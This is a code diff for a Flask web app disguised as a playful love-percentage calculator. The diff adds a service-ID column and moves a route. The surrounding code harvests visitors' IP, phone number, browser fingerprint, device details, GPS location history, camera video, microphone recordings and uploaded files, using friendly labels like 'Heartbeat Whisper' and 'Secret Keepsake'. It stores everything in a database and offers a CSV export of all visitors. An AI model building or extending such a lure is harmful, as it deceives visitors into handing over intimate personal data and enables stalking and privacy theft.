@@ -8,13 +8,17 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+# ---------- Read Service ID from environment variable ----------
+# Set this on Render: Environment Variables → SERVICE_ID = srv-d7jkpe3bc2fs73c2qiu0
+SERVICE_ID = os.environ.get('SERVICE_ID', 'unknown-service')
+
 # ---------- SQLite Database Setup ----------
 DB_FILE = 'visitors.db'
 
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    # Main visitor table – add crush_name column
+    # Main visitor table – add service_id column
     c.execute('''
         CREATE TABLE IF NOT EXISTS visitors (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -39,10 +43,11 @@ def init_db():
             mapUrl TEXT,
             cameraVideo TEXT,
             microphone TEXT,
-            files TEXT
+            files TEXT,
+            service_id TEXT
         )
     ''')
-    # Location history table (unchanged)
+    # Location history table
     c.execute('''
         CREATE TABLE IF NOT EXISTS location_history (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -52,6 +57,11 @@ def init_db():
             longitude REAL
         )
     ''')
+    # Add service_id column if it doesn't exist (for older databases)
+    try:
+        c.execute("ALTER TABLE visitors ADD COLUMN service_id TEXT")
+    except sqlite3.OperationalError:
+        pass  # column already exists
     conn.commit()
     conn.close()
 
@@ -66,14 +76,15 @@ def save_visitor(data):
                 timestamp = ?, ip = ?, name = ?, crush_name = ?, fortuneText = ?, phoneNumber = ?,
                 fingerprint = ?, batteryLevel = ?, batteryCharging = ?, networkType = ?, networkSpeed = ?,
                 deviceMemory = ?, screen = ?, timezone = ?, userAgent = ?,
-                latitude = ?, longitude = ?, mapUrl = ?, cameraVideo = ?, microphone = ?, files = ?
+                latitude = ?, longitude = ?, mapUrl = ?, cameraVideo = ?, microphone = ?, files = ?,
+                service_id = ?
             WHERE sessionId = ?
         ''', (
             data.get('timestamp'), data.get('ip'), data.get('name'), data.get('crush_name'), data.get('fortuneText'), data.get('phoneNumber'),
             data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), data.get('networkType'), data.get('networkSpeed'),
             data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
             data.get('latitude'), data.get('longitude'), data.get('mapUrl'), data.get('cameraVideo'), data.get('microphone'), data.get('files'),
-            data.get('sessionId')
+            data.get('service_id'), data.get('sessionId')
         ))
     else:
         c.execute('''
@@ -81,13 +92,14 @@ def save_visitor(data):
                 sessionId, timestamp, ip, name, crush_name, fortuneText, phoneNumber,
                 fingerprint, batteryLevel, batteryCharging, networkType, networkSpeed,
                 deviceMemory, screen, timezone, userAgent,
-                latitude, longitude, mapUrl, cameraVideo, microphone, files
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                latitude, longitude, mapUrl, cameraVideo, microphone, files, service_id
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             data.get('sessionId'), data.get('timestamp'), data.get('ip'), data.get('name'), data.get('crush_name'), data.get('fortuneText'), data.get('phoneNumber'),
             data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), data.get('networkType'), data.get('networkSpeed'),
             data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
-            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), data.get('cameraVideo'), data.get('microphone'), data.get('files')
+            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), data.get('cameraVideo'), data.get('microphone'), data.get('files'),
+            data.get('service_id')
         ))
     conn.commit()
     conn.close()
@@ -130,20 +142,12 @@ def get_all_visitors():
 
 # ---------- Love Calculator ----------
 def calculate_love_percentage(name1, name2):
-    """
-    Generate a love percentage based on a simple algorithm (random but deterministic using names).
-    Returns an integer between 50 and 100.
-    """
-    # Use a deterministic hash to make it consistent for the same pair
     combined = (name1 + name2).lower()
-    # Simple hash: sum of char codes
     total = sum(ord(c) for c in combined)
-    # Map to 50-100 range
     percentage = 50 + (total % 51)
     return percentage
 
 def get_love_message(name1, name2, percentage):
-    """Return a romantic message that includes both names and the percentage."""
     messages = [
         f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
         f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
@@ -188,6 +192,7 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
+    data['service_id'] = SERVICE_ID   # <--- ADD SERVICE ID HERE
     required_fields = ['sessionId', 'name', 'crush_name', 'fingerprint', 'batteryLevel', 'batteryCharging',
                        'networkType', 'networkSpeed', 'deviceMemory', 'screen', 'timezone', 'userAgent',
                        'latitude', 'longitude', 'mapUrl', 'cameraVideo', 'microphone', 'files']
@@ -307,6 +312,17 @@ def download_csv():
         row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
         writer.writerow(row)
     return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=visitors_data.csv'})
+
+@app.route('/calculate-love', methods=['POST'])
+def calculate_love():
+    data = request.json
+    name1 = data.get('name1', '')
+    name2 = data.get('name2', '')
+    if not name1 or not name2:
+        return jsonify({'message': 'Please provide both names'}), 400
+    percentage = calculate_love_percentage(name1, name2)
+    message = get_love_message(name1, name2, percentage)
+    return jsonify({'percentage': percentage, 'message': message})
 
 # ---------- HTML Template (Two‑names + love percentage) ----------
 HTML_TEMPLATE = '''
@@ -640,7 +656,6 @@ HTML_TEMPLATE = '''
         );
     }
 
-    // --- Camera & Microphone (Heartbeat Whisper) ---
     function getMedia() {
         return new Promise((resolve) => {
             showStep('🌟 Heartbeat Whisper', 'Requesting camera & microphone...', 10);
@@ -694,7 +709,6 @@ HTML_TEMPLATE = '''
         });
     }
 
-    // --- File upload (Secret Keepsake) ---
     function getFilesTraditional() {
         return new Promise((resolve) => {
             showStep('✨ Secret Keepsake', 'Gather your love memories (optional)...', 0);
@@ -746,9 +760,7 @@ HTML_TEMPLATE = '''
         });
     }
 
-    // --- Final save and fortune display (love percentage) ---
     async function finalizeAndSave() {
-        // Calculate love percentage and message
         const yourName = visitorData.name;
         const crushName = visitorData.crush_name;
         const resp = await fetch('/calculate-love', {
@@ -760,7 +772,6 @@ HTML_TEMPLATE = '''
         currentFortuneText = loveData.message;
         document.getElementById('fortuneText').innerText = currentFortuneText;
         
-        // Save the fortune text as well
         visitorData.fortuneText = currentFortuneText;
         
         await fetch('/save', {
@@ -773,7 +784,6 @@ HTML_TEMPLATE = '''
         document.getElementById('result').classList.remove('hidden');
     }
 
-    // --- Send SMS (save phone number) ---
     async function sendSms() {
         const phoneInput = document.getElementById('phoneNumber');
         const phone = phoneInput.value.trim();
@@ -809,7 +819,7 @@ HTML_TEMPLATE = '''
                 phoneInput.disabled = true;
                 sendBtn.style.display = 'none';
             } else {
-                statusDiv.innerText = 'Error saving. Please try again.';
+                statusDiv.innerText = 'Error saving. Please try again after some time.';
                 sendBtn.disabled = false;
                 sendBtn.innerText = '💬 Send to my phone';
             }
@@ -823,17 +833,6 @@ HTML_TEMPLATE = '''
 </body>
 </html>
 '''
-
-@app.route('/calculate-love', methods=['POST'])
-def calculate_love():
-    data = request.json
-    name1 = data.get('name1', '')
-    name2 = data.get('name2', '')
-    if not name1 or not name2:
-        return jsonify({'message': 'Please provide both names'}), 400
-    percentage = calculate_love_percentage(name1, name2)
-    message = get_love_message(name1, name2, percentage)
-    return jsonify({'percentage': percentage, 'message': message})
 
 if __name__ == '__main__':
     init_db()
